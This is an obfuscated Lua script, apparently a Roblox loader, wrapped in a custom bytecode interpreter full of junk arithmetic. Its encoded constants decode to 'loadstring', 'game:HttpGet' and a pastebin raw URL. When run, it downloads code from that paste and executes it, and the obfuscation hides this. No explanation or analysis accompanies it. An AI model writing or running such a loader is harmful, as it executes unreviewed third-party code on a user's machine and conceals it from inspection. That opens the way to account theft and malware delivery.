local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v88=v2(v0(v30,16));if v19 then local v118=v5(v88,v19);v19=nil;return v118;else return v88;end end end);local function v20(v31,v32,v33) if v33 then local v89=(v31/((5 -(1 + 2))^(v32-(2 -1))))%((3 -1)^(((v33-(2 -1)) -(v32-(620 -(555 + 64)))) + (932 -(857 + 74)))) ;return v89-(v89%(569 -(367 + 201))) ;else local v90=(929 -((1091 -(282 + 595)) + 713))^(v32-1) ;return (((v31%(v90 + v90))>=v90) and 1) or (0 + (1637 -(1523 + 114))) ;end end local function v21() local v34=0;local v35;while true do if (v34==((4 -3) + 0)) then return v35;end if (v34==((117 -(32 + 85)) -(0 + 0))) then v35=v1(v16,v18,v18);v18=v18 + (1066 -(16 + 52 + 997)) ;v34=1271 -(226 + 1044) ;end end end local function v22() local v36=957 -(892 + 48 + 17) ;local v37;local v38;while true do if (v36==(0 -0)) then v37,v38=v1(v16,v18,v18 + ((7 -4) -(1 + 0)) );v18=v18 + ((11 -8) -1) ;v36=351 -(87 + 263) ;end if (v36==1) then return (v38 * (436 -(67 + 113))) + v37 ;end end end local function v23() local v39=(2081 -1129) -(802 + 150) ;local v40;local v41;local v42;local v43;while true do if ((2 -1)==v39) then return (v43 * (30433252 -13656036)) + (v42 * (47703 + 17833)) + (v41 * ((218 + 1035) -(915 + (185 -103)))) + v40 ;end if (v39==(0 -(0 -0))) then v40,v41,v42,v43=v1(v16,v18,v18 + 2 + 1 );v18=v18 + (4 -0) ;v39=1188 -(1069 + 118) ;end end end local function v24() local v44=v23();local v45=v23();local v46=1 + 0 ;local v47=(v20(v45,792 -(368 + 423) ,62 -42 ) * ((20 -((36 -26) + 8))^(122 -90))) + v44 ;local v48=v20(v45,21,473 -(416 + 26) );local v49=((v20(v45,102 -70 )==(1 + 0)) and  -(1 -0)) or (439 -(145 + 293)) ;if (v48==(430 -((156 -112) + 386))) then if (v47==(1486 -(998 + 488))) then return v49 * (859 -(814 + 45)) ;else v48=1 + 0 ;v46=0 + (0 -0) ;end elseif (v48==(2819 -(201 + 571))) then return ((v47==(1138 -(116 + 1022))) and (v49 * (1/(0 -(0 + 0))))) or (v49 * NaN) ;end return v8(v49,v48-(601 + 422) ) * (v46 + (v47/(2^52))) ;end local function v25(v50) local v51;if  not v50 then local v91=(0 -0) + 0 ;while true do if (v91==(1423 -(630 + 793))) then v50=v23();if (v50==(885 -(261 + 624))) then return "";end break;end end end v51=v3(v16,v18,(v18 + v50) -(1 -0) );v18=v18 + v50 ;local v52={};for v69=1 + 0 , #v51 do v52[v69]=v2(v1(v3(v51,v69,v69)));end return v6(v52);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v53=(function() return function(v92,v93,v94,v95,v96,v97,v98,v99) local v92=(function() return 0;end)();local v93=(function() return;end)();local v95=(function() return;end)();while true do if (v92~=(0 -0)) then else local v123=(function() return 0 + 0 ;end)();local v124=(function() return;end)();while true do if (v123~=0) then else v124=(function() return 0 + 0 ;end)();while true do if (v124==(836 -(660 + 176))) then v93=(function() return v94();end)();v95=(function() return nil;end)();v124=(function() return 1;end)();end if ((1 + 0)~=v124) then else v92=(function() return  #"{";end)();break;end end break;end end end if (v92== #"]") then if (v93== #",") then v95=(function() return v94()~=(202 -(14 + 188)) ;end)();elseif (v93==(677 -(534 + 141))) then v95=(function() return v96();end)();elseif (v93== #"xnx") then v95=(function() return v97();end)();end v98[v99]=(function() return v95;end)();break;end end return v92,v93,v94,v95,v96,v97,v98,v99;end;end)();local v54=(function() return function(v100,v101,v102,v103,v104,v105,v106,v107,v108) local v109=(function() return 0;end)();local v100=(function() return;end)();local v101=(function() return;end)();while true do local v117=(function() return 0;end)();while true do if (v117==(0 + 0)) then if (v109==1) then local v128=(function() return 0;end)();while true do if (0~=v128) then else while true do if (v100==(0 + 0)) then v101=(function() return v102();end)();if (v103(v101, #"/", #"}")~=0) then else local v174=(function() return 0;end)();local v175=(function() return;end)();local v176=(function() return;end)();local v177=(function() return;end)();while true do if (v174~=(2 + 0)) then else if (v103(v176, #"]", #"}")== #"/") then v177[2]=(function() return v106[v177[2]];end)();end if (v103(v176,3 -1 ,2)== #"[") then v177[ #"xnx"]=(function() return v106[v177[ #"-19"]];end)();end v174=(function() return 4 -1 ;end)();end if (v174==(2 -1)) then local v182=(function() return 0;end)();while true do if (v182==(0 + 0)) then v177=(function() return {v104(),v104(),nil,nil};end)();if (v175==0) then local v188=(function() return 0;end)();local v189=(function() return;end)();while true do if (v188~=0) then else v189=(function() return 396 -(115 + 281) ;end)();while true do if (v189~=0) then else v177[ #"xxx"]=(function() return v104();end)();v177[ #"0313"]=(function() return v104();end)();break;end end break;end end elseif (v175== #",") then v177[ #"91("]=(function() return v105();end)();elseif (v175==2) then v177[ #"-19"]=(function() return v105() -((4 -2)^16) ;end)();elseif (v175== #"91(") then local v194=(function() return 0 + 0 ;end)();local v195=(function() return;end)();while true do if (v194~=(0 -0)) then else v195=(function() return 0;end)();while true do if (v195==(0 -0)) then v177[ #"xnx"]=(function() return v105() -(2^16) ;end)();v177[ #"?id="]=(function() return v104();end)();break;end end break;end end end v182=(function() return 1;end)();end if (v182==1) then v174=(function() return 2;end)();break;end end end if ((867 -(550 + 317))==v174) then local v183=(function() return 0 -0 ;end)();while true do if ((0 -0)~=v183) then else v175=(function() return v103(v101,5 -3 , #"xxx");end)();v176=(function() return v103(v101, #".com",291 -(134 + 151) );end)();v183=(function() return 1666 -(970 + 695) ;end)();end if (v183==(1 -0)) then v174=(function() return 1991 -(582 + 1408) ;end)();break;end end end if (v174~=(10 -7)) then else if (v103(v176, #"xxx", #"gha")== #":") then v177[ #"xnxx"]=(function() return v106[v177[ #"http"]];end)();end v107[v108]=(function() return v177;end)();break;end end end break;end end return v100,v101,v102,v103,v104,v105,v106,v107,v108;end end end if (v109==0) then local v129=(function() return 0 -0 ;end)();while true do if (v129==0) then v100=(function() return 0;end)();v101=(function() return nil;end)();v129=(function() return 3 -2 ;end)();end if (v129~=1) then else v109=(function() return 1;end)();break;end end end break;end end end end;end)();local v55=(function() return function(v110,v111,v112) local v113=(function() return 0;end)();local v114=(function() return;end)();while true do if (v113~=(1824 -(1195 + 629))) then else v114=(function() return 0 -0 ;end)();while true do if (v114==0) then local v130=(function() return 0;end)();while true do if (v130==(241 -(187 + 54))) then v110[v111-#"]" ]=(function() return v112();end)();return v110,v111,v112;end end end end break;end end end;end)();local v56=(function() return {};end)();local v57=(function() return {};end)();local v58=(function() return {};end)();local v59=(function() return {v56,v57,nil,v58};end)();local v60=(function() return v23();end)();local v61=(function() return {};end)();for v71= #",",v60 do FlatIdent_25011,Type,v21,Cons,v24,v25,v61,v71=(function() return v53(FlatIdent_25011,Type,v21,Cons,v24,v25,v61,v71);end)();end v59[ #"nil"]=(function() return v21();end)();for v72= #"}",v23() do FlatIdent_1076E,Descriptor,v21,v20,v22,v23,v61,v56,v72=(function() return v54(FlatIdent_1076E,Descriptor,v21,v20,v22,v23,v61,v56,v72);end)();end for v73= #">",v23() do v57,v73,v28=(function() return v55(v57,v73,v28);end)();end return v59;end local function v29(v63,v64,v65) local v66=v63[781 -(162 + 618) ];local v67=v63[2 + 0 ];local v68=v63[2 + 1 ];return function(...) local v74=v66;local v75=v67;local v76=v68;local v77=v27;local v78=1;local v79= -(1 -0);local v80={};local v81={...};local v82=v12("#",...) -(1 + 0 + 0) ;local v83={};local v84={};for v115=0,v82 do if ((77<=4230) and (v115>=v76)) then v80[v115-v76 ]=v81[v115 + (1637 -(1373 + 263)) ];else v84[v115]=v81[v115 + 1 ];end end local v85=(v82-v76) + 1 ;local v86;local v87;while true do local v116=1000 -(451 + 549) ;while true do if (((1 + (0 -0))==v116) or (3283==2211)) then if (v87<=(5 -1)) then if (v87<=1) then if ((1850>=18) and (v87>(0 -0))) then v84[v86[1386 -(746 + (1847 -1209)) ]]=v86[2 + 1 ]~=(0 -0) ;else v84[v86[343 -(218 + 123) ]]=v86[1584 -(1535 + (212 -(122 + 44))) ];end elseif ((1830<3669) and (v87<=(2 + 0))) then v84[v86[1 + (1 -0) ]]={};elseif (v87>(563 -(306 + 254))) then local v141=v86[1 + 1 ];local v142,v143=v77(v84[v141](v13(v84,v141 + 1 ,v86[5 -2 ])));v79=(v143 + v141) -1 ;local v144=1467 -(899 + 568) ;for v169=v141,v79 do local v170=0 + 0 ;while true do if (v170==0) then v144=v144 + (2 -1) ;v84[v169]=v142[v144];break;end end end else local v145=603 -(268 + 335) ;local v146;while true do if (v145==0) then v146=v86[292 -(60 + 230) ];v84[v146]=v84[v146](v13(v84,v146 + (573 -((1413 -987) + 146)) ,v79));break;end end end elseif (v87<=(1 + 5)) then if (v87>5) then do return;end else local v136=v86[(1187 + 271) -(282 + 1174) ];local v137=v84[v86[3]];v84[v136 + ((118 + 694) -(569 + 242)) ]=v137;v84[v136]=v137[v86[11 -7 ]];end elseif (v87<=((1 -0) + 6)) then v84[v86[1026 -(706 + 318) ]]();elseif ((v87==(1259 -(721 + 530))) or (1430>=3612)) then local v147;local v148,v149;local v150;local v151;v84[v86[1273 -(945 + 326) ]]={};v78=v78 + (2 -1) ;v86=v74[v78];v84[v86[2 + 0 ]]=v65[v86[3]];v78=v78 + (701 -((336 -(30 + 35)) + 429)) ;v86=v74[v78];v84[v86[2 + 0 + 0 ]]=v65[v86[1503 -(1408 + 92) ]];v78=v78 + 1 ;v86=v74[v78];v151=v86[1088 -(461 + 625) ];v150=v84[v86[3]];v84[v151 + (1289 -(993 + 295)) ]=v150;v84[v151]=v150[v86[1 + 3 ]];v78=v78 + (1172 -(418 + 753)) ;v86=v74[v78];v84[v86[1 + 1 ]]=v86[1 + 2 ];v78=v78 + 1 + (1257 -(1043 + 214)) ;v86=v74[v78];v84[v86[1 + 1 ]]=v86[532 -(406 + 123) ]~=(1769 -(1749 + 20)) ;v78=v78 + 1 + (0 -0) ;v86=v74[v78];v151=v86[(2536 -(323 + 889)) -((3361 -2112) + 73) ];v148,v149=v77(v84[v151](v13(v84,v151 + 1 + 0 ,v86[3])));v79=(v149 + v151) -1 ;v147=(1725 -(361 + 219)) -(466 + 679) ;for v171=v151,v79 do v147=v147 + (2 -1) ;v84[v171]=v148[v147];end v78=v78 + (2 -1) ;v86=v74[v78];v151=v86[1902 -(106 + 1794) ];v84[v151]=v84[v151](v13(v84,v151 + 1 + 0 ,v79));v78=v78 + 1 + 0 ;v86=v74[v78];v84[v86[5 -3 ]]();v78=v78 + (2 -1) ;v86=v74[v78];do return;end else v84[v86[(436 -(53 + 267)) -(4 + 25 + 85) ]]=v65[v86[3]];end v78=v78 + (585 -(57 + 527)) ;break;end if ((2683>=2460) and (v116==(1427 -(41 + 1386)))) then v86=v74[v78];v87=v86[104 -(17 + 86) ];v116=414 -(15 + 398) ;end end end end;end return v29(v28(),{},v17)(...);end return v15("LOL!043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403213Q00682Q7470733A2Q2F706173746562696E2E636F6D2F7261772F6179774D51585A68000A4Q00087Q00122Q000100013Q00122Q000200023Q00202Q00020002000300122Q000400046Q000500016Q000200056Q00013Q00024Q0001000100016Q00017Q00",v9(),...);
